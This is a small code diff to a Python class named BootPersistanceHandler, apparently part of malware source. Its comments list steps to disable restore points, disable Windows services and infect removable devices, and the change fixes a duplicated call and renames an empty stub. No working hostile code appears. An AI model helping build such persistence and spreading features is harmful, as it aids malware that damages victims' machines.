@@ -46,7 +46,7 @@ class BootPersistanceHandler:
             self.disableRestorePoints()
 
             # 5. Disable windows services
-            self.disableRestorePoints()
+            self.disableWindowsServices()
 
             # 6. Infect removable devices
             self.infectRemovableDevices()
@@ -158,7 +158,7 @@ class BootPersistanceHandler:
     # Disable Windows services
     #
 
-    def disableRestorePoints(self):
+    def disableWindowsServices(self):
         pass
 
     #
